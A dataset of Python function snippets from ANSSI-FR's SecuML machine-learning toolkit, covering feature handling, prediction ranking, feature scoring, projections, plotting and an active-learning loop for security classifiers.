    return {'ids': self.ids, 'names': self.names, 'descriptions': self.descriptions, 'types': [type_.name for type_ in self.types]}"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(obj):
    return FeaturesInfo(obj['ids'], obj['names'], obj['descriptions'], [FeatureType[type_] for type_ in obj['types']])"
ANSSI-FR/SecuML,_check_validity,"def _check_validity(self):
    num_features = len(self.ids)
    if len(self.names) != num_features:
        raise InvalidFeatures('There are %d features ids but %d features names are provided.' % (num_features, len(self.names)))
    if len(self.descriptions) != num_features:
        raise InvalidFeatures('There are %d features ids but %d features descriptions are provided.' % (num_features, len(self.descriptions)))
    if len(self.types) != num_features:
        raise InvalidFeatures('There are %d features ids but %d features types are provided.' % (num_features, len(self.types)))
    for type_ in self.types:
        if not isinstance(type_, FeatureType):
            raise InvalidFeatures('Features types must be an enum of FeatureType. %s is not a valid value.' % str(type_))"
ANSSI-FR/SecuML,__init__,"def __init__(self, values, info, instance_ids, streaming=False, stream_batch=None, sparse=False):
    self.values = values
    self.info = info
    self.instance_ids = instance_ids
    self.streaming = streaming
    self.stream_batch = stream_batch
    self.sparse = sparse
    self._check_validity()"
ANSSI-FR/SecuML,_check_validity,"def _check_validity(self):
    if self.streaming:
        if self.sparse:
            raise StreamingUnsupported('Sparse matrices cannot be processed as a stream.')
        else:
            return
    num_instances = self.instance_ids.num_instances()
    if num_instances != 0:
        if self.values.shape[0] != num_instances:
            raise InvalidFeatures('There are %d instances but the features of %d instances are provided.' % (num_instances, self.values.shape[0]))
        num_features = self.info.num_features()
        if self.values.shape[1] != num_features:
            raise InvalidFeatures('There are %d features ids but %d features are provided.' % (num_features, self.values.shape[1]))
    elif self.values.size != 0:
        raise InvalidFeatures('There is 0 instance but some features are provided.')"
ANSSI-FR/SecuML,union,"def union(self, features):
    if self.streaming or features.streaming:
        raise StreamingUnsupported('Union is not supported for streaming features.')
    if features.get_values().shape[0] == 0:
        return
    if self.get_values().shape[0] == 0:
        self.values = features.values
    else:
        self.values = np.vstack((self.values, features.values))
    self._check_validity()"
ANSSI-FR/SecuML,all_positives,"def all_positives(self):
    if self.streaming:
        raise StreamingUnsupported('all_positives is not supported for streaming features.')
    return self.values.min() >= 0"
ANSSI-FR/SecuML,get_from_ids,"def get_from_ids(self, instance_ids):
    if self.streaming:
        raise StreamingUnsupported('get_from_ids is not supported for streaming features.')
    indices = [self.instance_ids.get_index(id_) for id_ in instance_ids.ids]
    values = safe_indexing(self.values, indices)
    return Features(values, self.info, instance_ids)"
ANSSI-FR/SecuML,get_from_indices,"def get_from_indices(self, instance_ids, indices):
    if self.streaming:
        raise StreamingUnsupported('get_from_ids is not supported for streaming features.')
    if len(indices) > 0:
        values = safe_indexing(self.values, indices)
    else:
        values = np.empty((0, self.values.shape[1]))
    return Features(values, self.info, instance_ids)"
ANSSI-FR/SecuML,get_names,"def get_names(self):
    return self.info.names"
ANSSI-FR/SecuML,get_descriptions,"def get_descriptions(self):
    return self.info.descriptions"
ANSSI-FR/SecuML,get_ids,"def get_ids(self):
    return self.info.ids"
ANSSI-FR/SecuML,get_values,"def get_values(self):
    return self.values"
ANSSI-FR/SecuML,num_features,"def num_features(self):
    return self.info.num_features()"
ANSSI-FR/SecuML,set_instance_features,"def set_instance_features(self, instance_id, features):
    if self.streaming:
        raise StreamingUnsupported('set_instance_features is not supported for streaming features.')
    index = self.instance_ids.get_index(instance_id)
    self.values[index] = features"
ANSSI-FR/SecuML,get_instance_features,"def get_instance_features(self, instance_id):
    if self.streaming:
        raise StreamingUnsupported('get_instance_features is not supported for streaming features.')
    index = self.instance_ids.get_index(instance_id)
    return self.values[index, :]"
ANSSI-FR/SecuML,get_values_from_index,"def get_values_from_index(self, feature_index):
    if self.streaming:
        raise StreamingUnsupported('get_values_from_index is not supported for streaming features.')
    return self.values[:, feature_index]"
ANSSI-FR/SecuML,__init__,"def __init__(self, ids, idents=None, timestamps=None):
    self.ids = ids
    self._set_idents_timetamps(idents, timestamps)
    self.indexes = {}
    for i in range(len(self.ids)):
        self.indexes[self.ids[i]] = i"
ANSSI-FR/SecuML,union,"def union(self, ids):
    if ids.num_instances() == 0:
        return
    self.__init__(np.hstack((self.ids, ids.get_ids())), idents=np.hstack((self.idents, ids.idents)), timestamps=np.hstack((self.timestamps, ids.timestamps)))"
ANSSI-FR/SecuML,get_from_ids,"def get_from_ids(self, instance_ids):
    return Ids(instance_ids, idents=[self.get_ident(i) for i in instance_ids], timestamps=[self.get_timestamp(i) for i in instance_ids])"
ANSSI-FR/SecuML,get_from_indices,"def get_from_indices(self, instance_ids, indices):
    if len(instance_ids) == 0:
        return Ids(instance_ids, idents=np.array([]), timestamps=np.array([]))
    else:
        return Ids(instance_ids, idents=self.idents[indices], timestamps=self.timestamps[indices])"
ANSSI-FR/SecuML,num_instances,"def num_instances(self):
    return len(self.ids)"
ANSSI-FR/SecuML,get_index,"def get_index(self, instance_id):
    return self.indexes[instance_id]"
ANSSI-FR/SecuML,get_ids,"def get_ids(self):
    return self.ids"
ANSSI-FR/SecuML,get_ident,"def get_ident(self, instance_id):
    return self.idents[self.get_index(instance_id)]"
ANSSI-FR/SecuML,get_timestamp,"def get_timestamp(self, instance_id):
    return self.timestamps[self.get_index(instance_id)]"
ANSSI-FR/SecuML,get_ids_before,"def get_ids_before(self, cutoff_time):
    return self.ids[self.timestamps > cutoff_time]"
ANSSI-FR/SecuML,get_ids_after,"def get_ids_after(self, cutoff_time):
    return self.ids[self.timestamps >= cutoff_time]"
ANSSI-FR/SecuML,get_ids_between,"def get_ids_between(self, start, end):
    mask_end = self.timestamps < end
    mask_start = self.timestamps >= start
    mask = np.logical_and(mask_end, mask_start)
    return self.ids[mask]"
ANSSI-FR/SecuML,deepcopy,"@staticmethod
def deepcopy(ids):
    return Ids(deepcopy(ids.ids), deepcopy(ids.idents), deepcopy(ids.timestamps))"
ANSSI-FR/SecuML,_set_idents_timetamps,"def _set_idents_timetamps(self, idents, timestamps):
    self.idents = idents
    self.timestamps = timestamps
    num_instances = self.num_instances()
    if self.idents is None:
        self.idents = np.full((num_instances,), None)
    if self.timestamps is None:
        self.timestamps = np.full((num_instances,), None)"
ANSSI-FR/SecuML,__init__,"def __init__(self, ids, features, annotations, ground_truth):
    self.ids = ids
    self.features = features
    self.annotations = annotations
    self.ground_truth = ground_truth"
ANSSI-FR/SecuML,union,"def union(self, instances):
    if instances.num_instances() == 0:
        return
    self.ids.union(instances.ids)
    self.features.union(instances.features)
    self.annotations.union(instances.annotations)
    self.ground_truth.union(instances.ground_truth)"
ANSSI-FR/SecuML,has_ground_truth,"def has_ground_truth(self):
    return np.all(self.ground_truth.get_labels() != None)"
ANSSI-FR/SecuML,get_annotations,"def get_annotations(self, ground_truth):
    if ground_truth:
        return self.ground_truth
    else:
        return self.annotations"
ANSSI-FR/SecuML,num_instances,"def num_instances(self, label='all', ground_truth=False):
    if label == 'all':
        return self.ids.num_instances()
    else:
        annotations = self.get_annotations(ground_truth)
        return annotations.num_instances(label=label)"
ANSSI-FR/SecuML,num_features,"def num_features(self):
    return self.features.num_features()"
ANSSI-FR/SecuML,get_unlabeled_instances,"def get_unlabeled_instances(self):
    instance_ids = self.annotations.get_unlabeled_ids()
    return self.get_from_ids(instance_ids)"
ANSSI-FR/SecuML,has_unlabeled_data,"def has_unlabeled_data(self):
    return self.annotations.has_unlabeled_ids()"
ANSSI-FR/SecuML,get_annotated_instances,"def get_annotated_instances(self, label='all', family=None):
    instance_ids = self.annotations.get_annotated_ids(label=label, family=family)
    return self.get_from_ids(instance_ids)"
ANSSI-FR/SecuML,get_from_ids,"def get_from_ids(self, instance_ids):
    indices = np.array([self.ids.indexes[id_] for id_ in instance_ids])
    ids = self.ids.get_from_indices(instance_ids, indices)
    features = self.features.get_from_indices(ids, indices)
    annotations = self.annotations.get_from_indices(ids, indices)
    ground_truth = self.ground_truth.get_from_indices(ids, indices)
    return Instances(ids, features, annotations, ground_truth)"
ANSSI-FR/SecuML,get_features_ids,"def get_features_ids(self):
    return self.features.get_ids()"
ANSSI-FR/SecuML,get_sorted_timestamps,"def get_sorted_timestamps(self):
    timestamps = self.ids.timestamps
    indexes = list(range(self.num_instances()))
    t_indexes = list(zip(timestamps, indexes))
    t_indexes.sort()
    t_start = t_indexes[0][0]
    t_end = t_indexes[-1][0]
    return (t_indexes, t_start, t_end)"
ANSSI-FR/SecuML,label_bool_to_str,"def label_bool_to_str(label):
    if label is None:
        return None
    elif label:
        return MALICIOUS
    else:
        return BENIGN"
ANSSI-FR/SecuML,label_str_to_bool,"def label_str_to_bool(label):
    if label is None:
        return None
    return label == MALICIOUS"
ANSSI-FR/SecuML,__str__,"def __str__(self):
    return 'Inconsistent predictions.'"
ANSSI-FR/SecuML,__init__,"def __init__(self, message):
    self.message = message"
ANSSI-FR/SecuML,__str__,"def __str__(self):
    return self.message"
ANSSI-FR/SecuML,__init__,"def __init__(self, multiclass, predictions):
    self.multiclass = multiclass
    self.with_probas = predictions._with_probas()
    self.with_scores = predictions._with_scores()
    self.with_ground_truth = predictions._with_ground_truth()"
ANSSI-FR/SecuML,equal,"def equal(self, predictions_info):
    return self.multiclass == predictions_info.multiclass and self.with_probas == predictions_info.with_probas and (self.with_scores == predictions_info.with_scores) and (self.with_ground_truth == predictions_info.with_ground_truth)"
ANSSI-FR/SecuML,__init__,"def __init__(self, value, all_probas, proba, score, rank, instance_id, multiclass, ground_truth=None):
    self.value = value
    self.all_probas = all_probas
    self.proba = proba
    self.score = score
    self.rank = rank
    self.instance_id = instance_id
    self.multiclass = multiclass
    self.ground_truth = ground_truth"
ANSSI-FR/SecuML,value_to_str,"def value_to_str(self):
    if self.multiclass:
        return str(self.value)
    else:
        return label_bool_to_str(self.value)"
ANSSI-FR/SecuML,__init__,"def __init__(self, values, ids, multiclass, all_probas=None, probas=None, all_scores=None, scores=None, ground_truth=None):
    self.values = values
    self.ids = ids
    self.all_probas = self._get_ndarray(all_probas)
    self.probas = self._get_nparray(probas)
    self.all_scores = self._get_ndarray(all_scores)
    self.scores = self._get_nparray(scores)
    self.ground_truth = self._get_nparray(ground_truth)
    self._check_validity()
    self.info = PredictionsInfo(multiclass, self)
    self._set_ranking()"
ANSSI-FR/SecuML,num_instances,"def num_instances(self):
    return self.ids.num_instances()"
ANSSI-FR/SecuML,get_alerts,"def get_alerts(self, threshold=None, top_n=None):
    if threshold is not None and self.info.with_probas:
        return [self.get_prediction_from_index(i[0]) for (i, proba) in np.ndenumerate(self.probas) if proba > threshold]
    elif top_n is not None:
        num_instances = self.num_instances()
        if num_instances <= top_n:
            return self.to_list()
        if self.info.with_probas or self.info.with_scores:
            return [self.get_prediction_from_index(i) for i in range(num_instances) if self.ranking[i] < top_n]
        else:
            ids = [i[0] for (i, value) in np.ndenumerate(self.values) if value]
            if top_n < len(ids):
                ids = random.sample(ids, top_n)
            return [self.get_prediction_from_index(id_) for id_ in ids]
    else:
        return [self.get_prediction_from_index(i[0]) for (i, value) in np.ndenumerate(self.values) if value]"
ANSSI-FR/SecuML,union,"def union(self, predictions):
    if self.info.multiclass != predictions.info.multiclass:
        raise InvalidPredictions('Predictions with multiclass and binary values cannot be concatenated.')
    self.values = np.hstack((self.values, predictions.values))
    self.ids.union(predictions.ids)
    self.all_probas = np.vstack((self.all_probas, predictions.all_probas))
    self.probas = np.hstack((self.probas, predictions.probas))
    self.all_scores = np.vstack((self.all_scores, predictions.all_scores))
    self.scores = np.hstack((self.scores, predictions.scores))
    self.ground_truth = np.hstack((self.ground_truth, predictions.ground_truth))
    self._set_ranking()"
ANSSI-FR/SecuML,_set_ranking,"def _set_ranking(self):

    def _rank_elems(values):
        arg_sort = np.argsort(-values)
        ranking = np.zeros(arg_sort.shape)
        for (i, v) in enumerate(arg_sort):
            ranking[v] = i
        return ranking
    if self.info.with_probas:
        self.ranking = _rank_elems(self.probas)
    elif self.info.with_scores:
        self.ranking = _rank_elems(self.scores)
    else:
        self.ranking = np.full((self.num_instances(),), None)"
ANSSI-FR/SecuML,get_prediction,"def get_prediction(self, instance_id):
    return self.get_prediction_from_index(self.ids.get_index(instance_id))"
ANSSI-FR/SecuML,get_prediction_from_index,"def get_prediction_from_index(self, index):
    return Prediction(self.values[index], self.all_probas[index], self.probas[index], self.scores[index], self.ranking[index], self.ids.ids[index], self.info.multiclass, ground_truth=self.ground_truth[index])"
ANSSI-FR/SecuML,get_from_ids,"def get_from_ids(self, instance_ids):
    return [self.get_prediction(i) for i in instance_ids]"
ANSSI-FR/SecuML,get_within_range,"def get_within_range(self, proba_min, proba_max):
    return [self.get_prediction_from_index(i[0]) for (i, proba) in np.ndenumerate(self.probas) if proba > proba_min and proba <= proba_max]"
ANSSI-FR/SecuML,to_list,"def to_list(self):
    return [self.get_prediction_from_index(i) for i in range(self.num_instances())]"
ANSSI-FR/SecuML,get_random,"def get_random(self, batch, drop_instances):
    selected_ids = [i for i in self.ids.ids if i not in drop_instances]
    if batch < self.num_instances():
        selected_ids = random.sample(selected_ids, batch)
    return self.get_from_ids(selected_ids)"
ANSSI-FR/SecuML,set_ground_truth,"def set_ground_truth(self, ground_truth):
    num_instances = self.num_instances()
    if self.ground_truth.shape[0] != num_instances:
        raise InvalidPredictions('There are %d instances but %d ground-truth annotations are provided' % (num_instances, self.ground_truth.shape[0]))
    self.ground_truth = ground_truth
    self.info.with_ground_truth = self._with_ground_truth()"
ANSSI-FR/SecuML,deepcopy,"@staticmethod
def deepcopy(predictions):
    return Predictions(deepcopy(predictions.values), Ids.deepcopy(predictions.ids), predictions.info.multiclass, all_probas=deepcopy(predictions.all_probas), probas=deepcopy(predictions.probas), all_scores=deepcopy(predictions.all_scores), scores=deepcopy(predictions.scores), ground_truth=deepcopy(predictions.ground_truth))"
ANSSI-FR/SecuML,_check_validity,"def _check_validity(self):
    num_instances = self.num_instances()
    if self.values.shape[0] != num_instances:
        raise InvalidPredictions('There are %d instances but %d values are provided.' % (num_instances, self.values.shape[0]))
    elif self.all_probas.shape[0] != num_instances:
        raise InvalidPredictions('There are %d instances but %d arrays of probabilities are provided.' % (num_instances, self.all_probas.shape[0]))
    elif self.probas.shape[0] != num_instances:
        raise InvalidPredictions('There are %d instances but %d probabilities are provided.' % (num_instances, self.probas.shape[0]))
    elif self.all_scores.shape[0] != num_instances:
        raise InvalidPredictions('There are %d instances but %d arrays of scores are provided.' % (num_instances, self.scores.shape[0]))
    elif self.scores.shape[0] != num_instances:
        raise InvalidPredictions('There are %d instances but %d scores are provided.' % (num_instances, self.scores.shape[0]))
    elif self.ground_truth.shape[0] != num_instances:
        raise InvalidPredictions('There are %d instances but %d ground-truth annotations are provided.' % (num_instances, self.ground_truth.shape[0]))"
ANSSI-FR/SecuML,_get_nparray,"def _get_nparray(self, array):
    if array is None:
        return np.full((self.num_instances(),), None)
    else:
        return array"
ANSSI-FR/SecuML,_get_ndarray,"def _get_ndarray(self, array):
    if array is None:
        return np.full((self.num_instances(), 1), None)
    else:
        return array"
ANSSI-FR/SecuML,_with_probas,"def _with_probas(self):
    return np.all(self.probas != None)"
ANSSI-FR/SecuML,_with_scores,"def _with_scores(self):
    return np.all(self.scores != None)"
ANSSI-FR/SecuML,_with_ground_truth,"def _with_ground_truth(self):
    return np.all(self.ground_truth != None)"
ANSSI-FR/SecuML,_rank_elems,"def _rank_elems(values):
    arg_sort = np.argsort(-values)
    ranking = np.zeros(arg_sort.shape)
    for (i, v) in enumerate(arg_sort):
        ranking[v] = i
    return ranking"
ANSSI-FR/SecuML,__init__,"def __init__(self, instances, multiclass, logger, with_density=True):
    self.instances = instances
    self.multiclass = multiclass
    self.logger = logger
    self.with_density = with_density
    self.num_features = self.instances.num_features()
    self.plots = []
    self.scoring = FeaturesScoring(self.instances, self.multiclass)"
ANSSI-FR/SecuML,gen_plots,"def gen_plots(self, output_dir, save=False):
    for feature_index in range(self.num_features):
        plot = FeaturePlots(self.instances, self.multiclass, feature_index, self.logger, with_density=self.with_density)
        plot.compute()
        plot.export(output_dir)
        if save:
            self.plots.append(plot)"
ANSSI-FR/SecuML,gen_scoring,"def gen_scoring(self, output_dir):
    self.scoring.compute()
    self.scoring.export(output_dir)"
ANSSI-FR/SecuML,__init__,"def __init__(self, instances, multiclass, feature_index, logger, with_density=True):
    self.feature_index = feature_index
    self.logger = logger
    self.with_density = with_density
    features_info = instances.features.info
    self.feature_type = features_info.types[self.feature_index]
    self.feature_name = features_info.names[self.feature_index]
    self.feature_id = features_info.ids[self.feature_index]
    self._gen_plot_datasets(instances, multiclass)"
ANSSI-FR/SecuML,compute,"def compute(self):
    if self.feature_type == FeatureType.binary:
        self._gen_binary_histogram()
    elif self.feature_type == FeatureType.numeric:
        self._gen_bloxplot()
        self._gen_histogram()
        if self.with_density:
            self._gen_density()"
ANSSI-FR/SecuML,export,"def export(self, output_dir):
    output_dir = path.join(output_dir, str(self.feature_id))
    os.makedirs(output_dir)
    if self.feature_type == FeatureType.binary:
        self.barplot.export_to_json(path.join(output_dir, 'binary_histogram.json'))
    elif self.feature_type == FeatureType.numeric:
        self.boxplot.display(path.join(output_dir, 'boxplot.png'))
        self.barplot.export_to_json(path.join(output_dir, 'histogram.json'))
        if self.with_density:
            self.density.display(path.join(output_dir, 'density.png'))"
ANSSI-FR/SecuML,_gen_plot_datasets,"def _gen_plot_datasets(self, instances, multiclass):
    self.plot_datasets = {}
    if not multiclass:
        self._gen_label_plot_dataset(instances, label=MALICIOUS)
        self._gen_label_plot_dataset(instances, label=BENIGN)
        self._gen_label_plot_dataset(instances, label='unlabeled')
    else:
        families = list(instances.annotations.get_families_values())
        families_colors = colors(len(families))
        for (family, color) in zip(families, families_colors):
            self._gen_label_plot_dataset(instances, family=family, color=color)"
ANSSI-FR/SecuML,_gen_label_plot_dataset,"def _gen_label_plot_dataset(self, instances, label=None, family=None, color=None):
    if label is not None:
        if label != 'unlabeled':
            instances = instances.get_annotated_instances(label=label)
        else:
            instances = instances.get_unlabeled_instances()
    else:
        instances = instances.get_annotated_instances(family=family)
    values = instances.features.get_values_from_index(self.feature_index)
    if isinstance(values, spmatrix):
        values = values.toarray()
    plot_label = label if label is not None else family
    plot_color = color
    if plot_color is None:
        plot_color = get_label_color(plot_label)
    dataset = PlotDataset(values, plot_label)
    dataset.set_color(plot_color)
    self.plot_datasets[plot_label] = dataset"
ANSSI-FR/SecuML,_gen_bloxplot,"def _gen_bloxplot(self):
    self.boxplot = BoxPlot(title='Feature %s' % self.feature_name)
    for (label, dataset) in self.plot_datasets.items():
        if dataset.values.shape[0] > 0:
            self.boxplot.add_dataset(dataset)"
ANSSI-FR/SecuML,_gen_histogram,"def _gen_histogram(self):
    self.barplot = Histogram(self.plot_datasets, self.logger)"
ANSSI-FR/SecuML,_gen_binary_histogram,"def _gen_binary_histogram(self):
    self.barplot = BarPlot(['0', '1'])
    for (label, dataset) in self.plot_datasets.items():
        if dataset.values.shape[0] > 0:
            num_0 = sum(dataset.values == 0)
            num_1 = sum(dataset.values == 1)
            hist_dataset = PlotDataset(np.array([num_0, num_1]), label)
            hist_dataset.set_color(dataset.color)
            self.barplot.add_dataset(hist_dataset)"
ANSSI-FR/SecuML,_gen_density,"def _gen_density(self):
    self.density = Density(title='Feature %s' % self.feature_name)
    for (_, dataset) in self.plot_datasets.items():
        if dataset.values.shape[0] > 0:
            self.density.add_dataset(dataset)"
ANSSI-FR/SecuML,__init__,"def __init__(self, value, pvalue):
    self.value = value
    self.pvalue = pvalue
    self.rank = None"
ANSSI-FR/SecuML,set_rank,"def set_rank(self, rank):
    self.rank = rank"
ANSSI-FR/SecuML,to_json,"def to_json(self):
    value = '%.2f' % self.value
    pvalue = None if self.pvalue is None else '%.2E' % Decimal(self.pvalue)
    return {'value': value, 'pvalue': pvalue, 'rank': self.rank + 1}"
ANSSI-FR/SecuML,__init__,"def __init__(self, feature_id, scores, scoring_func):
    self.feature_id = feature_id
    self._set_scores(scores, scoring_func)"
ANSSI-FR/SecuML,set_rank,"def set_rank(self, func, rank):
    self.scores[func].set_rank(rank)"
ANSSI-FR/SecuML,export,"def export(self, output_dir):
    to_export = {}
    for (func, score_value_rank) in self.scores.items():
        to_export[func] = score_value_rank.to_json()
    output_filename = path.join(output_dir, str(self.feature_id), 'scores.json')
    with open(output_filename, 'w') as f:
        json.dump(to_export, f, indent=2)"
ANSSI-FR/SecuML,_set_scores,"def _set_scores(self, scores, scoring_func):
    self.scores = {}
    for (func, has_pvalue) in scoring_func:
        row = scores.loc[self.feature_id]
        value = row[func]
        pvalue = None
        if has_pvalue:
            pvalue = row['_'.join([func, 'pvalues'])]
        self.scores[func] = ScoreValueRank(value, pvalue)"
ANSSI-FR/SecuML,__init__,"def __init__(self, instances, multiclass):
    self.instances = instances
    self.multiclass = multiclass
    self.annotated_instances = instances.get_annotated_instances()
    self._set_scoring_func()"
ANSSI-FR/SecuML,compute,"def compute(self):
    self._compute_scores()
    self._compute_features_scoring_ranking()"
ANSSI-FR/SecuML,_set_scoring_func,"def _set_scoring_func(self):
    self.scoring_func = [('variance', False)]
    if self.annotated_instances.num_instances() > 0:
        self.scoring_func.append(('f_classif', True))
        self.scoring_func.append(('mutual_info_classif', False))
        if self.instances.features.all_positives():
            self.scoring_func.append(('chi2', True))"
ANSSI-FR/SecuML,_compute_scores,"def _compute_scores(self):
    scores_dict = {}
    for (func, has_pvalue) in self.scoring_func:
        (scores, p_values) = self.compute_scoring_func(func)
        scores_dict[func] = scores
        if has_pvalue:
            scores_dict['_'.join([func, 'pvalues'])] = p_values
    self.scores = pd.DataFrame(scores_dict, index=self.instances.features.info.ids)"
ANSSI-FR/SecuML,_compute_features_scoring_ranking,"def _compute_features_scoring_ranking(self):
    self.features_scores = {}
    for (i, feature_id) in enumerate(self.instances.features.info.ids):
        self.features_scores[feature_id] = FeatureScoring(feature_id, self.scores, self.scoring_func)
    for (func, _) in self.scoring_func:
        sort_data_frame(self.scores, func, False, True)
        for (rank, feature_id) in enumerate(self.scores.index.values):
            self.features_scores[feature_id].set_rank(func, rank)"
ANSSI-FR/SecuML,export,"def export(self, output_dir):
    self.scores.to_csv(path.join(output_dir, 'scores.csv'), index_label='features_ids')
    for (_, feature_scores) in self.features_scores.items():
        feature_scores.export(output_dir)"
ANSSI-FR/SecuML,compute_scoring_func,"def compute_scoring_func(self, func):
    if func == 'variance':
        features = self.instances.features.get_values()
        annotations = self.instances.annotations.get_labels()
        if isinstance(features, spmatrix):
            variance = mean_variance_axis(features, axis=0)[1]
        else:
            variance = features.var(axis=0)
        return (variance, None)
    features = self.annotated_instances.features.get_values()
    annotations = self.annotated_instances.annotations.get_supervision(self.multiclass)
    if func == 'f_classif':
        return f_classif(features, annotations)
    elif func == 'mutual_info_classif':
        if isinstance(features, spmatrix):
            discrete_indexes = True
        else:
            features_types = self.instances.features.info.types
            discrete_indexes = [i for (i, t) in enumerate(features_types) if t == FeatureType.binary]
            if not discrete_indexes:
                discrete_indexes = False
        return (mutual_info_classif(features, annotations, discrete_features=discrete_indexes), None)
    elif func == 'chi2':
        return chi2(features, annotations)
    else:
        assert False"
ANSSI-FR/SecuML,__init__,"def __init__(self, conf):
    self.conf = conf"
ANSSI-FR/SecuML,gen_input_params,"@abc.abstractmethod
def gen_input_params(self, instances):
    return"
ANSSI-FR/SecuML,component_labels,"def component_labels(self, features_names):
    return ['C_' + str(x) for x in range(self.num_components)]"
ANSSI-FR/SecuML,set_num_components,"def set_num_components(self):
    self.num_components = self.projection_matrix.shape[1]"
ANSSI-FR/SecuML,create_pipeline,"def create_pipeline(self):
    self.pipeline = Pipeline([('scaler', StandardScaler()), ('projection', self.projection)])"
ANSSI-FR/SecuML,set_projection_matrix,"@abc.abstractmethod
def set_projection_matrix(self):
    return"
ANSSI-FR/SecuML,fit,"@abc.abstractmethod
def fit(self, instances):
    return"
ANSSI-FR/SecuML,transform,"def transform(self, instances):
    features_values = instances.features.get_values()
    features_names = instances.features.get_names()
    projected_features = self.component_labels(features_names)
    projection_types = [FeatureType.numeric for _ in range(self.num_components)]
    projection = Features(self.pipeline.transform(features_values), FeaturesInfo(range(len(projected_features)), projected_features, projected_features, projection_types), instances.ids)
    return Instances(instances.ids, projection, instances.annotations, instances.ground_truth)"
ANSSI-FR/SecuML,features_preprocessing,"def features_preprocessing(self, instances):
    features = copy.deepcopy(instances.features.get_values())
    features = np.array(features)
    features.flat[::features.shape[1] + 1] += 0.01
    return features"
ANSSI-FR/SecuML,export_fit,"def export_fit(self, output_dir, instances):
    self.export_projection_matrix(output_dir, instances.features.get_names())"
ANSSI-FR/SecuML,export_transform,"def export_transform(self, output_dir, instances, projected_instances):
    visu = Visualization(self, output_dir)
    visu.all_hex_bin(projected_instances)"
ANSSI-FR/SecuML,assess_perf,"def assess_perf(self, output_dir, projected_instances):
    if not projected_instances.has_ground_truth():
        return None
    evaluation = PerfMonitoring(self)
    evaluation.computer_perf(projected_instances)
    return evaluation"
ANSSI-FR/SecuML,export_projection_matrix,"def export_projection_matrix(self, output_dir, features_names):
    projection_matrix = pd.DataFrame(self.projection_matrix, columns=self.component_labels(features_names), index=features_names)
    projection_matrix.index.name = 'feature'
    projection_matrix.to_csv(path.join(output_dir, 'projection_matrix.csv'), sep=',', header=True, index=True)"
ANSSI-FR/SecuML,get_error_color,"def get_error_color(error):
    if error is None:
        return blue
    elif error:
        return red
    else:
        return green"
ANSSI-FR/SecuML,get_label_color,"def get_label_color(label):
    global green
    global red
    global blue
    if label == MALICIOUS:
        return red
    elif label == BENIGN:
        return green
    elif label in ['all', 'unlabeled']:
        return blue
    else:
        return None"
ANSSI-FR/SecuML,display_in_red,"def display_in_red(e):
    return '\x1b[91m{}\x1b[00m'.format(e)"
ANSSI-FR/SecuML,display_in_green,"def display_in_green(e):
    return '\x1b[32m{}\x1b[00m'.format(e)"
ANSSI-FR/SecuML,colors,"def colors(num):
    colors = color_palette(palette='hls', n_colors=num)
    return list(map(rgb2hex, colors))"
ANSSI-FR/SecuML,__init__,"def __init__(self, message):
    self.message = message"
ANSSI-FR/SecuML,__str__,"def __str__(self):
    return self.message"
ANSSI-FR/SecuML,valid_date,"def valid_date(s):
    try:
        return datetime.datetime.strptime(s, '%Y-%m-%d %H:%M:%S')
    except ValueError:
        msg = ""Not a valid date: '{0}'."".format(s)
        raise argparse.ArgumentTypeError(msg)"
ANSSI-FR/SecuML,float_equality,"def float_equality(v1, v2):
    return math.fabs(v1 - v2) < sys.float_info.epsilon"
ANSSI-FR/SecuML,to_percentage,"def to_percentage(x):
    if math.isnan(x):
        return str(x)
    else:
        return '%.2f%%' % (x * 100)"
ANSSI-FR/SecuML,trunc,"def trunc(x):
    if math.isnan(x):
        return x
    else:
        return '%.2f' % x"
ANSSI-FR/SecuML,get_logger,"def get_logger(name, level, output_file):
    logging.captureWarnings(True)
    level = logging.getLevelName(level)
    logger = logging.getLogger(name)
    logger.setLevel(level)
    if output_file is None:
        log_handler = logging.StreamHandler()
    else:
        log_handler = logging.FileHandler(output_file)
    logger.addHandler(log_handler)
    return (logger, log_handler)"
ANSSI-FR/SecuML,close_logger,"def close_logger(logger, log_handler):
    logger.removeHandler(log_handler)
    log_handler.flush()
    log_handler.close()"
ANSSI-FR/SecuML,disable_matplotlib_logging,"def disable_matplotlib_logging():
    matplotlib_logger = logging.getLogger('matplotlib.font_manager')
    matplotlib_logger.setLevel(logging.CRITICAL)
    ch = logging.StreamHandler()
    matplotlib_logger.addHandler(ch)"
ANSSI-FR/SecuML,warnings_raise_errors,"def warnings_raise_errors():
    np.seterr(all='raise')
    pd.options.mode.chained_assignment = 'raise'"
ANSSI-FR/SecuML,sort_data_frame,"def sort_data_frame(df, column, ascending, inplace):
    if inplace:
        df.sort_values([column], ascending=[ascending], inplace=inplace)
        return
    else:
        return df.sort_values([column], ascending=[ascending], inplace=inplace)"
ANSSI-FR/SecuML,add_to_db,"def add_to_db(self):
    Experiment.add_to_db(self)
    al_exp = ActiveLearningExpAlchemy(id=self.exp_id, current_iter=0, finished=False)
    self.session.add(al_exp)
    self.session.flush()"
ANSSI-FR/SecuML,run,"def run(self):
    Experiment.run(self)
    datasets = Datasets(self.get_instances())
    active_learning = ActiveLearning(self, datasets)
    if not self.exp_conf.core_conf.auto:
        from secuml.exp.celery_app.app import secumlworker
        from secuml.exp.active_learning.celery_tasks import IterationTask
        options = {}
        active_learning.run_next_iter(output_dir=self.output_dir())
        IterationTask.iteration_object = active_learning
        secumlworker.enable_config_fromcmdline = False
        secumlworker.run(**options)
    else:
        active_learning.run_iterations(output_dir=self.output_dir())"
ANSSI-FR/SecuML,web_template,"def web_template(self):
    return 'active_learning/main.html'"
ANSSI-FR/SecuML,get_current_iter,"def get_current_iter(self):
    query = self.session.query(ActiveLearningExpAlchemy)
    query = query.filter(ActiveLearningExpAlchemy.id == self.exp_id)
    return query.one().current_iter"
ANSSI-FR/SecuML,__init__,"def __init__(self, exp, datasets):
    CoreActiveLearning.__init__(self, exp.exp_conf.core_conf, datasets)
    self.exp = exp"
ANSSI-FR/SecuML,run_iterations,"def run_iterations(self, output_dir=None):
    stop = False
    while not stop:
        stop = self.run_next_iter(output_dir)
    query = self.exp.session.query(ActiveLearningExpAlchemy)
    query = query.filter(ActiveLearningExpAlchemy.id == self.exp.exp_id)
    exp_db = query.one()
    exp_db.finished = True"
ANSSI-FR/SecuML,run_next_iter,"def run_next_iter(self, output_dir=None):
    self.curr_iter = Iteration(self.exp, self.iter_num, datasets=self.datasets, prev_iter=self.prev_iter, budget=self.current_budget)
    try:
        self.current_budget = self.curr_iter.run()
    except (NoAnnotationAdded, NoUnlabeledDataLeft) as e:
        self.exp.exp_conf.logger.info(e)
        return True
    else:
        self.exp.session.commit()
        self.iter_num += 1
        self.curr_iter.prev_iter = None
